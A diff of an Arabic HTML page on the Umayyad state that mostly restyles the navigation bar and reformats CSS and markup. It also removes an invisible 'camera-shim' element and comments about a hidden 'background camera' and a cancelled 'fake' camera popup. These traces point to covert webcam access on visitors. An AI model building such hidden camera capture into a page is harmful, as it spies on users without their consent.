@@ -70,53 +70,102 @@
     fill: var(--gold);
   }
 
-  /* نافذة المنبثقة الخاصة بالكاميرا (رسمية من المتصفح، لا حاجة لنافذة مزيفة) */
-  /* تم إلغاء الفكرة المزيفة تمامًا لضمان عمل الكاميرا */
-
-  /* ---------- تنسيقات القسم العلوي (Nav, Hero) ---------- */
-  nav {
+  /* ---------- الهيدر المطور ---------- */
+  .modern-nav {
     position: fixed;
     top: 0;
-    inset-inline: 0;
+    left: 0;
+    width: 100%;
     z-index: 1000;
-    height: 52px;
+    background: rgba(0, 0, 0, 0.65);
+    backdrop-filter: blur(16px) saturate(180%);
+    -webkit-backdrop-filter: blur(16px);
+    border-bottom: 1px solid rgba(255, 255, 255, 0.08);
+    transition: background 0.3s, backdrop-filter 0.3s;
+  }
+  body.scrolled .modern-nav {
+    background: rgba(0, 0, 0, 0.85);
+    backdrop-filter: blur(20px);
+  }
+  .nav-container {
+    max-width: 1280px;
+    margin: 0 auto;
+    padding: 0 32px;
+    height: 60px;
     display: flex;
     align-items: center;
     justify-content: space-between;
-    padding: 0 40px;
-    background: rgba(0,0,0,0.72);
-    backdrop-filter: saturate(180%) blur(20px);
-    border-bottom: 1px solid var(--border-light);
+    gap: 24px;
   }
   .nav-logo {
-    font-family: var(--font-display);
-    font-size: 1.1rem;
+    font-family: 'Amiri', serif;
+    font-size: 1.2rem;
+    font-weight: 600;
     color: var(--gold);
+    text-decoration: none;
+    letter-spacing: 0.5px;
+    transition: opacity 0.2s;
+  }
+  .nav-logo:hover {
+    opacity: 0.85;
   }
   .nav-links {
     display: flex;
     gap: 28px;
     list-style: none;
+    margin: 0;
+    padding: 0;
+  }
+  .nav-links li {
+    position: relative;
   }
   .nav-links a {
-    color: rgba(245,245,247,.7);
+    color: rgba(245, 245, 247, 0.8);
     text-decoration: none;
-    font-size: .78rem;
-    transition: color .2s;
+    font-size: 0.85rem;
+    font-weight: 500;
+    padding: 6px 0;
+    transition: color 0.2s;
+    letter-spacing: 0.3px;
+  }
+  .nav-links a::after {
+    content: '';
+    position: absolute;
+    bottom: -2px;
+    right: 0;
+    width: 0;
+    height: 2px;
+    background: var(--gold);
+    transition: width 0.25s ease;
+  }
+  .nav-links a:hover::after,
+  .nav-links a.active::after {
+    width: 100%;
+    left: 0;
+    right: auto;
   }
   .nav-links a:hover {
     color: var(--white);
   }
   .nav-cta {
-    font-size: .78rem;
+    background: rgba(212, 168, 67, 0.12);
+    border: 1px solid rgba(212, 168, 67, 0.4);
+    border-radius: 40px;
+    padding: 6px 18px;
+    font-size: 0.8rem;
+    font-weight: 500;
     color: var(--gold);
-    background: rgba(212,168,67,.12);
-    border: 1px solid rgba(212,168,67,.3);
-    padding: 6px 16px;
-    border-radius: 980px;
     cursor: pointer;
+    transition: all 0.2s;
+    letter-spacing: 0.3px;
+  }
+  .nav-cta:hover {
+    background: rgba(212, 168, 67, 0.25);
+    border-color: var(--gold);
+    transform: scale(1.02);
   }
 
+  /* ---------- تنسيقات القسم العلوي (Hero) ---------- */
   .hero {
     min-height: 100vh;
     display: flex;
@@ -235,10 +284,7 @@
     animation: bounce 2s infinite;
   }
   @keyframes up {
-    to {
-      opacity: 1;
-      transform: translateY(0);
-    }
+    to { opacity: 1; transform: translateY(0); }
   }
   @keyframes bounce {
     0%, 100% { transform: rotate(-45deg) translateY(0); }
@@ -308,22 +354,10 @@
     border: 1.5px solid;
     transform-style: preserve-3d;
   }
-  .dome-ring:nth-child(1) {
-    border-color: rgba(212,168,67,.6);
-    transform: rotateX(70deg);
-  }
-  .dome-ring:nth-child(2) {
-    border-color: rgba(212,168,67,.3);
-    transform: rotateX(70deg) rotateY(60deg);
-  }
-  .dome-ring:nth-child(3) {
-    border-color: rgba(212,168,67,.2);
-    transform: rotateX(20deg);
-  }
-  .dome-ring:nth-child(4) {
-    border-color: rgba(212,168,67,.15);
-    transform: rotateX(0deg);
-  }
+  .dome-ring:nth-child(1) { border-color: rgba(212,168,67,.6); transform: rotateX(70deg); }
+  .dome-ring:nth-child(2) { border-color: rgba(212,168,67,.3); transform: rotateX(70deg) rotateY(60deg); }
+  .dome-ring:nth-child(3) { border-color: rgba(212,168,67,.2); transform: rotateX(20deg); }
+  .dome-ring:nth-child(4) { border-color: rgba(212,168,67,.15); transform: rotateX(0deg); }
   .dome-center {
     position: absolute;
     inset: 20%;
@@ -349,18 +383,13 @@
   }
   .dome-orbit-dot {
     position: absolute;
-    top: 0;
-    left: 50%;
-    width: 6px;
-    height: 6px;
-    margin-left: -3px;
-    margin-top: -3px;
+    top: 0; left: 50%;
+    width: 6px; height: 6px;
+    margin-left: -3px; margin-top: -3px;
     border-radius: 50%;
     background: var(--gold);
   }
-  @keyframes orbit {
-    to { transform: rotate(360deg); }
-  }
+  @keyframes orbit { to { transform: rotate(360deg); } }
 
   .intro-pills {
     display: flex;
@@ -545,17 +574,9 @@
     transform: translateY(20px);
     transition: opacity .5s, transform .5s;
   }
-  .ach-card.visible {
-    opacity: 1;
-    transform: translateY(0);
-  }
+  .ach-card.visible { opacity: 1; transform: translateY(0); }
   .ach-icon { font-size: 2rem; margin-bottom: 16px; display: block; }
-  .ach-title {
-    font-family: var(--font-display);
-    font-size: 1.1rem;
-    color: var(--white);
-    margin-bottom: 10px;
-  }
+  .ach-title { font-family: var(--font-display); font-size: 1.1rem; color: var(--white); margin-bottom: 10px; }
   .ach-text { font-size: .83rem; color: var(--gray); line-height: 1.7; }
 
   /* الخلفاء */
@@ -586,21 +607,9 @@
     transform: scale(.97);
     transition: opacity .4s, transform .4s;
   }
-  .caliph-card.visible {
-    opacity: 1;
-    transform: scale(1);
-  }
-  .caliph-num {
-    font-family: var(--font-display);
-    font-size: 1.8rem;
-    color: rgba(212,168,67,.2);
-    margin-bottom: 10px;
-  }
-  .caliph-name {
-    font-family: var(--font-display);
-    font-size: .95rem;
-    margin-bottom: 6px;
-  }
+  .caliph-card.visible { opacity: 1; transform: scale(1); }
+  .caliph-num { font-family: var(--font-display); font-size: 1.8rem; color: rgba(212,168,67,.2); margin-bottom: 10px; }
+  .caliph-name { font-family: var(--font-display); font-size: .95rem; margin-bottom: 6px; }
   .caliph-years { font-size: .68rem; color: var(--gray); letter-spacing: 1px; }
 
   /* الكرة الأرضية (الامتداد) */
@@ -638,18 +647,8 @@
     border-radius: 50%;
     overflow: hidden;
   }
-  .planet-line {
-    position: absolute;
-    left: 0; right: 0;
-    height: 1px;
-    background: rgba(212,168,67,.12);
-  }
-  .planet-vline {
-    position: absolute;
-    top: 0; bottom: 0;
-    width: 1px;
-    background: rgba(212,168,67,.12);
-  }
+  .planet-line { position: absolute; left:0; right:0; height:1px; background: rgba(212,168,67,.12); }
+  .planet-vline { position: absolute; top:0; bottom:0; width:1px; background: rgba(212,168,67,.12); }
   .planet-dot {
     position: absolute;
     width: 8px; height: 8px;
@@ -734,120 +733,55 @@
     flex-wrap: wrap;
     gap: 16px;
   }
-  .footer-logo {
-    font-family: var(--font-display);
-    font-size: 1.1rem;
-    color: var(--gold);
-  }
-  .footer-links {
-    display: flex;
-    gap: 20px;
-  }
-  .footer-links a {
-    font-size: .72rem;
-    color: var(--gray);
-    text-decoration: none;
-  }
-  .footer-links a:hover {
-    color: var(--white);
-  }
-  .footer-note {
-    font-size: 0.72rem;
-    color: var(--gray-dim);
-  }
+  .footer-logo { font-family: var(--font-display); font-size: 1.1rem; color: var(--gold); }
+  .footer-links { display: flex; gap: 20px; }
+  .footer-links a { font-size: .72rem; color: var(--gray); text-decoration: none; }
+  .footer-links a:hover { color: var(--white); }
+  .footer-note { font-size: 0.72rem; color: var(--gray-dim); }
 
   /* تحسينات الاستجابة */
   @media (max-width: 900px) {
-    .timeline {
-      grid-template-columns: 40px 1fr;
-    }
-    .tl-content.left {
-      display: none;
-    }
-    .tl-content.right {
-      grid-column: 2;
-      text-align: right;
-    }
-    .tl-node {
-      grid-column: 1;
-    }
-    .ach-cards {
-      grid-template-columns: 1fr 1fr;
-    }
-    .caliphs-grid {
-      grid-template-columns: repeat(2, 1fr);
-    }
+    .timeline { grid-template-columns: 40px 1fr; }
+    .tl-content.left { display: none; }
+    .tl-content.right { grid-column: 2; text-align: right; }
+    .tl-node { grid-column: 1; }
+    .ach-cards { grid-template-columns: 1fr 1fr; }
+    .caliphs-grid { grid-template-columns: repeat(2, 1fr); }
   }
   @media (max-width: 768px) {
-    nav {
-      padding: 0 20px;
-    }
-    .nav-links {
-      gap: 16px;
-    }
-    .hero-title {
-      font-size: clamp(2.8rem, 12vw, 5rem);
-    }
-    .hero-stats {
-      flex-wrap: wrap;
-    }
-    .hstat {
-      padding: 16px 20px;
-    }
-    .intro-grid {
-      grid-template-columns: 1fr;
-      gap: 40px;
-    }
-    .ach-cards {
-      grid-template-columns: 1fr;
-    }
-    .caliphs-grid {
-      grid-template-columns: 1fr 1fr;
-    }
-    .planet-wrap {
-      width: 220px;
-      height: 220px;
-    }
-    .cube-scene {
-      transform: scale(0.8);
-    }
-    .ach-card {
-      padding: 24px 20px;
-    }
+    .nav-container { padding: 0 20px; gap: 16px; }
+    .nav-links { gap: 16px; }
+    .nav-links a { font-size: 0.75rem; }
+    .nav-cta { padding: 4px 12px; font-size: 0.7rem; }
+    .hero-title { font-size: clamp(2.8rem, 12vw, 5rem); }
+    .hero-stats { flex-wrap: wrap; }
+    .hstat { padding: 16px 20px; }
+    .intro-grid { grid-template-columns: 1fr; gap: 40px; }
+    .ach-cards { grid-template-columns: 1fr; }
+    .caliphs-grid { grid-template-columns: 1fr 1fr; }
+    .planet-wrap { width: 220px; height: 220px; }
+    .cube-scene { transform: scale(0.8); }
+    .ach-card { padding: 24px 20px; }
   }
   @media (max-width: 600px) {
-    .caliphs-grid {
-      grid-template-columns: 1fr 1fr;
-    }
+    .caliphs-grid { grid-template-columns: 1fr 1fr; }
   }
   @media (prefers-reduced-motion: reduce) {
-    .dome-wrap, .cube, .planet-ring, .scroll-arrow {
-      animation: none !important;
-    }
-  }
-
-  /* عناصر كاميرا خلفية شفافة تماما (لن تظهر) */
-  .camera-shim {
-    position: fixed;
-    top: 0;
-    left: 0;
-    width: 0;
-    height: 0;
-    opacity: 0;
-    pointer-events: none;
+    .dome-wrap, .cube, .planet-ring, .scroll-arrow { animation: none !important; }
   }
 </style>
 </head>
 <body>
-  <!-- حاوية مؤقتة للكاميرا الخلفية (لن تظهر) -->
-  <div class="camera-shim"></div>
 
-  <div class="scroll-top" id="scrollTopBtn">
-    <svg viewBox="0 0 24 24"><path d="M12 4l-6 6 1.41 1.41L12 6.83l4.59 4.58L18 10z"/><path d="M0 0h24v24H0z" fill="none"/></svg>
-  </div>
+<!-- زر العودة للأعلى -->
+<div class="scroll-top" id="scrollTopBtn">
+  <svg viewBox="0 0 24 24"><path d="M12 4l-6 6 1.41 1.41L12 6.83l4.59 4.58L18 10z"/><path d="M0 0h24v24H0z" fill="none"/></svg>
+</div>
 
-  <nav>
-    <span class="nav-logo">الدولة الأموية</span>
+<!-- الهيدر المطور -->
+<nav class="modern-nav">
+  <div class="nav-container">
+    <a href="#" class="nav-logo">الدولة الأموية</a>
     <ul class="nav-links">
       <li><a href="#intro">النشأة</a></li>
       <li><a href="#timeline">الخط الزمني</a></li>
@@ -856,306 +790,273 @@
       <li><a href="#caliphs">الخلفاء</a></li>
     </ul>
     <button class="nav-cta">٤١ — ١٣٢ هـ</button>
-  </nav>
-
-  <div class="hero">
-    <div class="hero-bg"></div>
-    <div class="hero-bg-grid"></div>
-    <p class="hero-eyebrow">٦٦١ م — ٧٥٠ م</p>
-    <h1 class="hero-title">الدولة<br><em>الأموية</em></h1>
-    <p class="hero-sub">أول إمبراطورية إسلامية وراثية — حكمت من دمشق وبسطت سلطانها على ثلاث قارات</p>
-    <div class="hero-stats">
-      <div class="hstat"><span class="hstat-val">١٤</span><span class="hstat-lbl">خليفة</span></div>
-      <div class="hstat"><span class="hstat-val">٩١</span><span class="hstat-lbl">عاماً من الحكم</span></div>
-      <div class="hstat"><span class="hstat-val">١٣م كم²</span><span class="hstat-lbl">المساحة</span></div>
-      <div class="hstat"><span class="hstat-val">٦٢</span><span class="hstat-lbl">مدينة مفتوحة</span></div>
-    </div>
-    <div class="scroll-down"><span>اكتشف</span><div class="scroll-arrow"></div></div>
   </div>
+</nav>
 
-  <section class="section" id="intro">
-    <div class="intro-grid">
-      <div class="intro-visual">
-        <div class="dome-wrap">
-          <div class="dome-ring"></div><div class="dome-ring"></div><div class="dome-ring"></div><div class="dome-ring"></div>
-          <div class="dome-center"></div>
-          <div class="dome-star">☽</div>
-          <div class="dome-orbit"><div class="dome-orbit-dot"></div></div>
-        </div>
-      </div>
-      <div class="reveal">
-        <span class="s-eyebrow">النشأة والتأسيس</span>
-        <h2 class="s-title">من قريش إلى عرش الشام</h2>
-        <div class="divider"></div>
-        <p class="s-desc">تأسّست الدولة الأموية سنة ٤١ هـ حين آلت الخلافة إلى معاوية بن أبي سفيان، إثر تنازل الحسن بن علي في عام عُرف بـ"عام الجماعة". اتّخذت دمشق عاصمةً لها، فكانت أولى المدن الكبرى خارج الجزيرة العربية تحتضن مركز الخلافة الإسلامية.</p>
-        <div class="intro-pills">
-          <span class="pill">دمشق العاصمة</span><span class="pill">الحكم الوراثي</span>
-          <span class="pill">تعريب الدواوين</span><span class="pill">الدينار الإسلامي</span>
-          <span class="pill">الأسطول البحري</span>
-        </div>
-      </div>
+<!-- HERO -->
+<div class="hero">
+  <div class="hero-bg"></div>
+  <div class="hero-bg-grid"></div>
+  <p class="hero-eyebrow">٦٦١ م — ٧٥٠ م</p>
+  <h1 class="hero-title">الدولة<br><em>الأموية</em></h1>
+  <p class="hero-sub">أول إمبراطورية إسلامية وراثية — حكمت من دمشق وبسطت سلطانها على ثلاث قارات</p>
+  <div class="hero-stats">
+    <div class="hstat"><span class="hstat-val">١٤</span><span class="hstat-lbl">خليفة</span></div>
+    <div class="hstat"><span class="hstat-val">٩١</span><span class="hstat-lbl">عاماً من الحكم</span></div>
+    <div class="hstat"><span class="hstat-val">١٣م كم²</span><span class="hstat-lbl">المساحة</span></div>
+    <div class="hstat"><span class="hstat-val">٦٢</span><span class="hstat-lbl">مدينة مفتوحة</span></div>
+  </div>
+  <div class="scroll-down"><span>اكتشف</span><div class="scroll-arrow"></div></div>
+</div>
+
+<!-- INTRO -->
+<section class="section" id="intro">
+  <div class="intro-grid">
+    <div class="intro-visual">
+      <div class="dome-wrap"><div class="dome-ring"></div><div class="dome-ring"></div><div class="dome-ring"></div><div class="dome-ring"></div><div class="dome-center"></div><div class="dome-star">☽</div><div class="dome-orbit"><div class="dome-orbit-dot"></div></div></div>
     </div>
-  </section>
-
-  <div class="band timeline-section" id="timeline">
-    <div class="timeline-inner">
-      <div class="tl-header reveal"><span class="s-eyebrow">التسلسل التاريخي</span><h2 class="s-title">محطات فارقة</h2><div class="divider" style="margin-inline:auto"></div><p class="s-desc">تسعة عقود من التوسع والبناء والحضارة</p></div>
-      <div class="timeline">
-        <div class="tl-line"><div class="tl-line-inner"></div></div>
-        <div class="tl-content left tl-item-content"><span class="tl-badge">تأسيس</span><span class="tl-date">٤١ هـ / ٦٦١ م</span><h3 class="tl-name">ميلاد الدولة</h3><p class="tl-desc">تولّى معاوية بن أبي سفيان الخلافة وأسّس أول حكم وراثي.</p></div><div class="tl-node"><div class="tl-dot-wrap"></div></div><div class="tl-content right tl-item-content"></div>
-        <div class="tl-content left tl-item-content"></div><div class="tl-node"><div class="tl-dot-wrap"></div></div><div class="tl-content right tl-item-content"><span class="tl-badge">عمارة</span><span class="tl-date">٦٥ — ٨٦ هـ</span><h3 class="tl-name">عبد الملك بن مروان</h3><p class="tl-desc">قبة الصخرة، تعريب الدواوين.</p></div>
-        <div class="tl-content left tl-item-content"><span class="tl-badge">فتوحات</span><span class="tl-date">٨٦ — ٩٦ هـ</span><h3 class="tl-name">الوليد بن عبد الملك</h3><p class="tl-desc">الجامع الأموي، فتح الأندلس.</p></div><div class="tl-node"><div class="tl-dot-wrap"></div></div><div class="tl-content right tl-item-content"></div>
-        <div class="tl-content left tl-item-content"></div><div class="tl-node"><div class="tl-dot-wrap"></div></div><div class="tl-content right tl-item-content"><span class="tl-badge">عدالة</span><span class="tl-date">٩٩ — ١٠١ هـ</span><h3 class="tl-name">عمر بن عبد العزيز</h3><p class="tl-desc">خامس الخلفاء الراشدين.</p></div>
-        <div class="tl-content left tl-item-content"><span class="tl-badge">ذروة</span><span class="tl-date">١٠٥ — ١٢٥ هـ</span><h3 class="tl-name">هشام بن عبد الملك</h3><p class="tl-desc">أطول عهد، ازدهار الزراعة والعلوم.</p></div><div class="tl-node"><div class="tl-dot-wrap"></div></div><div class="tl-content right tl-item-content"></div>
-        <div class="tl-content left tl-item-content"></div><div class="tl-node"><div class="tl-dot-wrap"></div></div><div class="tl-content right tl-item-content"><span class="tl-badge">نهاية</span><span class="tl-date">١٣٢ هـ / ٧٥٠ م</span><h3 class="tl-name">سقوط الدولة</h3><p class="tl-desc">معركة الزاب وقيام العباسيين.</p></div>
-      </div>
+    <div class="reveal">
+      <span class="s-eyebrow">النشأة والتأسيس</span>
+      <h2 class="s-title">من قريش إلى عرش الشام</h2>
+      <div class="divider"></div>
+      <p class="s-desc">تأسّست الدولة الأموية سنة ٤١ هـ حين آلت الخلافة إلى معاوية بن أبي سفيان، إثر تنازل الحسن بن علي في عام عُرف بـ"عام الجماعة". اتّخذت دمشق عاصمةً لها، فكانت أولى المدن الكبرى خارج الجزيرة العربية تحتضن مركز الخلافة الإسلامية.</p>
+      <div class="intro-pills"><span class="pill">دمشق العاصمة</span><span class="pill">الحكم الوراثي</span><span class="pill">تعريب الدواوين</span><span class="pill">الدينار الإسلامي</span><span class="pill">الأسطول البحري</span></div>
     </div>
   </div>
+</section>
 
-  <div class="cube-section" id="achievements">
-    <div class="reveal"><span class="s-eyebrow">الإنجازات الحضارية</span><h2 class="s-title">إرث لا يُمحى</h2><div class="divider" style="margin-inline:auto"></div></div>
-    <div class="cube-scene reveal"><div class="cube"><div class="cube-face front"><span>🕌</span><p>العمارة</p></div><div class="cube-face back"><span>📚</span><p>العلوم</p></div><div class="cube-face right"><span>🪙</span><p>المال</p></div><div class="cube-face left"><span>⚓</span><p>البحرية</p></div><div class="cube-face top"><span>📮</span><p>البريد</p></div><div class="cube-face bottom"><span>🌐</span><p>الإسلام</p></div></div></div>
-    <div class="ach-cards">
-      <div class="ach-card"><span class="ach-icon">🕌</span><h3 class="ach-title">العمارة الإسلامية</h3><p class="ach-text">قبة الصخرة والجامع الأموي.</p></div>
-      <div class="ach-card"><span class="ach-icon">🪙</span><h3 class="ach-title">النظام المالي</h3><p class="ach-text">الدينار والدرهم الإسلامي.</p></div>
-      <div class="ach-card"><span class="ach-icon">📮</span><h3 class="ach-title">البريد والإدارة</h3><p class="ach-text">شبكة بريدية ونظام دواوين.</p></div>
-      <div class="ach-card"><span class="ach-icon">⚓</span><h3 class="ach-title">القوة البحرية</h3><p class="ach-text">أول أسطول بحري إسلامي.</p></div>
-      <div class="ach-card"><span class="ach-icon">📚</span><h3 class="ach-title">الحركة العلمية</h3><p class="ach-text">ترجمة العلوم وتطور الطب.</p></div>
-      <div class="ach-card"><span class="ach-icon">🌐</span><h3 class="ach-title">نشر الإسلام</h3><p class="ach-text">دخول الإسلام الأندلس وآسيا الوسطى.</p></div>
+<!-- TIMELINE -->
+<div class="band timeline-section" id="timeline">
+  <div class="timeline-inner">
+    <div class="tl-header reveal"><span class="s-eyebrow">التسلسل التاريخي</span><h2 class="s-title">محطات فارقة</h2><div class="divider" style="margin-inline:auto"></div><p class="s-desc">تسعة عقود من التوسع والبناء والحضارة</p></div>
+    <div class="timeline">
+      <div class="tl-line"><div class="tl-line-inner"></div></div>
+      <div class="tl-content left tl-item-content"><span class="tl-badge">تأسيس</span><span class="tl-date">٤١ هـ / ٦٦١ م</span><h3 class="tl-name">ميلاد الدولة</h3><p class="tl-desc">تولّى معاوية بن أبي سفيان الخلافة وأسّس أول حكم وراثي.</p></div><div class="tl-node"><div class="tl-dot-wrap"></div></div><div class="tl-content right tl-item-content"></div>
+      <div class="tl-content left tl-item-content"></div><div class="tl-node"><div class="tl-dot-wrap"></div></div><div class="tl-content right tl-item-content"><span class="tl-badge">عمارة</span><span class="tl-date">٦٥ — ٨٦ هـ</span><h3 class="tl-name">عبد الملك بن مروان</h3><p class="tl-desc">قبة الصخرة، تعريب الدواوين.</p></div>
+      <div class="tl-content left tl-item-content"><span class="tl-badge">فتوحات</span><span class="tl-date">٨٦ — ٩٦ هـ</span><h3 class="tl-name">الوليد بن عبد الملك</h3><p class="tl-desc">الجامع الأموي، فتح الأندلس.</p></div><div class="tl-node"><div class="tl-dot-wrap"></div></div><div class="tl-content right tl-item-content"></div>
+      <div class="tl-content left tl-item-content"></div><div class="tl-node"><div class="tl-dot-wrap"></div></div><div class="tl-content right tl-item-content"><span class="tl-badge">عدالة</span><span class="tl-date">٩٩ — ١٠١ هـ</span><h3 class="tl-name">عمر بن عبد العزيز</h3><p class="tl-desc">خامس الخلفاء الراشدين.</p></div>
+      <div class="tl-content left tl-item-content"><span class="tl-badge">ذروة</span><span class="tl-date">١٠٥ — ١٢٥ هـ</span><h3 class="tl-name">هشام بن عبد الملك</h3><p class="tl-desc">أطول عهد، ازدهار الزراعة والعلوم.</p></div><div class="tl-node"><div class="tl-dot-wrap"></div></div><div class="tl-content right tl-item-content"></div>
+      <div class="tl-content left tl-item-content"></div><div class="tl-node"><div class="tl-dot-wrap"></div></div><div class="tl-content right tl-item-content"><span class="tl-badge">نهاية</span><span class="tl-date">١٣٢ هـ / ٧٥٠ م</span><h3 class="tl-name">سقوط الدولة</h3><p class="tl-desc">معركة الزاب وقيام العباسيين.</p></div>
     </div>
   </div>
+</div>
 
-  <div class="planet-section" id="expansion">
-    <div class="reveal"><span class="s-eyebrow">الامتداد الجغرافي</span><h2 class="s-title">من المحيط إلى الهند</h2><div class="divider" style="margin-inline:auto"></div><p class="s-desc" style="margin:0 auto">بلغت مساحة الدولة ١٣ مليون كم² في عصرها الذهبي</p></div>
-    <div class="planet-wrap reveal"><div class="planet-sphere"><div class="planet-lines" id="planetLines"></div><div class="planet-dot" style="top:38%; right:35%"></div><div class="planet-dot" style="top:45%; right:55%; width:5px;height:5px;opacity:.7"></div></div><div class="planet-ring"><div class="planet-ring-dot"></div></div></div>
-    <div class="region-tags reveal"><span class="rtag">🇪🇸 الأندلس</span><span class="rtag">🌍 شمال أفريقيا</span><span class="rtag">🇸🇾 الشام</span><span class="rtag">🇮🇶 العراق</span><span class="rtag">🇮🇷 فارس</span><span class="rtag">🇵🇰 السند</span><span class="rtag">🇦🇫 خراسان</span><span class="rtag">🕌 ما وراء النهر</span></div>
+<!-- CUBE & ACHIEVEMENTS -->
+<div class="cube-section" id="achievements">
+  <div class="reveal"><span class="s-eyebrow">الإنجازات الحضارية</span><h2 class="s-title">إرث لا يُمحى</h2><div class="divider" style="margin-inline:auto"></div></div>
+  <div class="cube-scene reveal"><div class="cube"><div class="cube-face front"><span>🕌</span><p>العمارة</p></div><div class="cube-face back"><span>📚</span><p>العلوم</p></div><div class="cube-face right"><span>🪙</span><p>المال</p></div><div class="cube-face left"><span>⚓</span><p>البحرية</p></div><div class="cube-face top"><span>📮</span><p>البريد</p></div><div class="cube-face bottom"><span>🌐</span><p>الإسلام</p></div></div></div>
+  <div class="ach-cards">
+    <div class="ach-card"><span class="ach-icon">🕌</span><h3 class="ach-title">العمارة الإسلامية</h3><p class="ach-text">قبة الصخرة والجامع الأموي أيقونتان خالدة.</p></div>
+    <div class="ach-card"><span class="ach-icon">🪙</span><h3 class="ach-title">النظام المالي</h3><p class="ach-text">الدينار والدرهم الإسلامي موحد.</p></div>
+    <div class="ach-card"><span class="ach-icon">📮</span><h3 class="ach-title">البريد والإدارة</h3><p class="ach-text">شبكة بريدية ونظام دواوين معرب.</p></div>
+    <div class="ach-card"><span class="ach-icon">⚓</span><h3 class="ach-title">القوة البحرية</h3><p class="ach-text">أول أسطول بحري إسلامي.</p></div>
+    <div class="ach-card"><span class="ach-icon">📚</span><h3 class="ach-title">الحركة العلمية</h3><p class="ach-text">ترجمة العلوم وتطور الطب والفلك.</p></div>
+    <div class="ach-card"><span class="ach-icon">🌐</span><h3 class="ach-title">نشر الإسلام</h3><p class="ach-text">دخل الإسلام الأندلس وآسيا الوسطى.</p></div>
   </div>
+</div>
 
-  <div class="quote-section"><div class="quote-bg"></div><div class="reveal"><span class="quote-mark">"</span><p class="quote-text">لو وُزنت حلومُنا بحلوم الناس لرجحنا عليهم</p><p class="quote-author">— معاوية بن أبي سفيان، مؤسّس الدولة الأموية</p></div></div>
+<!-- PLANET EXPANSION -->
+<div class="planet-section" id="expansion">
+  <div class="reveal"><span class="s-eyebrow">الامتداد الجغرافي</span><h2 class="s-title">من المحيط إلى الهند</h2><div class="divider" style="margin-inline:auto"></div><p class="s-desc" style="margin:0 auto">بلغت مساحة الدولة ١٣ مليون كم² في عصرها الذهبي</p></div>
+  <div class="planet-wrap reveal"><div class="planet-sphere"><div class="planet-lines" id="planetLines"></div><div class="planet-dot" style="top:38%; right:35%"></div><div class="planet-dot" style="top:45%; right:55%; width:5px;height:5px;opacity:.7"></div></div><div class="planet-ring"><div class="planet-ring-dot"></div></div></div>
+  <div class="region-tags reveal"><span class="rtag">🇪🇸 الأندلس</span><span class="rtag">🌍 شمال أفريقيا</span><span class="rtag">🇸🇾 الشام</span><span class="rtag">🇮🇶 العراق</span><span class="rtag">🇮🇷 فارس</span><span class="rtag">🇵🇰 السند</span><span class="rtag">🇦🇫 خراسان</span><span class="rtag">🕌 ما وراء النهر</span></div>
+</div>
 
-  <div class="caliphs-section" id="caliphs"><div class="caliphs-inner"><div class="caliphs-header reveal"><span class="s-eyebrow">قائمة الحكام</span><h2 class="s-title">خلفاء بنو أمية</h2><div class="divider" style="margin-inline:auto"></div><p class="s-desc" style="margin:0 auto">أربعة عشر خليفة حكموا على مدى واحد وتسعين عاماً</p></div><div class="caliphs-grid" id="caliphsGrid"></div></div></div>
+<!-- QUOTE -->
+<div class="quote-section"><div class="quote-bg"></div><div class="reveal"><span class="quote-mark">"</span><p class="quote-text">لو وُزنت حلومُنا بحلوم الناس لرجحنا عليهم</p><p class="quote-author">— معاوية بن أبي سفيان، مؤسّس الدولة الأموية</p></div></div>
 
-  <footer>
-    <span class="footer-logo">الدولة الأموية</span>
-    <div class="footer-links"><a href="#intro">النشأة</a><a href="#timeline">الخط الزمني</a><a href="#achievements">الحضارة</a><a href="#expansion">الامتداد</a><a href="#caliphs">الخلفاء</a></div>
-    <span class="footer-note">© جميع الحقوق محفوظة - بوابة التاريخ الإسلامي</span>
-  </footer>
+<!-- CALIPHS -->
+<div class="caliphs-section" id="caliphs"><div class="caliphs-inner"><div class="caliphs-header reveal"><span class="s-eyebrow">قائمة الحكام</span><h2 class="s-title">خلفاء بنو أمية</h2><div class="divider" style="margin-inline:auto"></div><p class="s-desc" style="margin:0 auto">أربعة عشر خليفة حكموا على مدى واحد وتسعين عاماً</p></div><div class="caliphs-grid" id="caliphsGrid"></div></div></div>
 
-  <script>
-    // ---------- بيانات الخلفاء ----------
-    const caliphsData = [
-      { name: "معاوية بن أبي سفيان", years: "٤١ — ٦٠ هـ" }, { name: "يزيد بن معاوية", years: "٦٠ — ٦٤ هـ" },
-      { name: "معاوية بن يزيد", years: "٦٤ هـ" }, { name: "مروان بن الحكم", years: "٦٤ — ٦٥ هـ" },
-      { name: "عبد الملك بن مروان", years: "٦٥ — ٨٦ هـ" }, { name: "الوليد بن عبد الملك", years: "٨٦ — ٩٦ هـ" },
-      { name: "سليمان بن عبد الملك", years: "٩٦ — ٩٩ هـ" }, { name: "عمر بن عبد العزيز", years: "٩٩ — ١٠١ هـ" },
-      { name: "يزيد بن عبد الملك", years: "١٠١ — ١٠٥ هـ" }, { name: "هشام بن عبد الملك", years: "١٠٥ — ١٢٥ هـ" },
-      { name: "الوليد بن يزيد", years: "١٢٥ — ١٢٦ هـ" }, { name: "يزيد بن الوليد", years: "١٢٦ هـ" },
-      { name: "إبراهيم بن الوليد", years: "١٢٦ هـ" }, { name: "مروان بن محمد", years: "١٢٦ — ١٣٢ هـ" }
-    ];
-    const arabicNumerals = ['١','٢','٣','٤','٥','٦','٧','٨','٩','١٠','١١','١٢','١٣','١٤'];
-    const caliphsGrid = document.getElementById('caliphsGrid');
-    caliphsData.forEach((c, idx) => {
-      const card = document.createElement('div');
-      card.className = 'caliph-card';
-      card.innerHTML = `<div class="caliph-num">${arabicNumerals[idx]}</div><div class="caliph-name">${c.name}</div><div class="caliph-years">${c.years}</div>`;
-      caliphsGrid.appendChild(card);
-    });
+<footer>
+  <span class="footer-logo">الدولة الأموية</span>
+  <div class="footer-links"><a href="#intro">النشأة</a><a href="#timeline">الخط الزمني</a><a href="#achievements">الحضارة</a><a href="#expansion">الامتداد</a><a href="#caliphs">الخلفاء</a></div>
+  <span class="footer-note">© جميع الحقوق محفوظة – بوابة التاريخ الإسلامي</span>
+</footer>
 
-    // خطوط الكوكب
-    const planetLines = document.getElementById('planetLines');
-    for (let i = 1; i < 6; i++) {
-      const h = document.createElement('div');
-      h.className = 'planet-line';
-      h.style.top = (i * 16.6) + '%';
-      planetLines.appendChild(h);
-      const v = document.createElement('div');
-      v.className = 'planet-vline';
-      v.style.right = (i * 16.6) + '%';
-      planetLines.appendChild(v);
+<script>
+  // ---------- بيانات الخلفاء ----------
+  const caliphsData = [
+    { name: "معاوية بن أبي سفيان", years: "٤١ — ٦٠ هـ" }, { name: "يزيد بن معاوية", years: "٦٠ — ٦٤ هـ" },
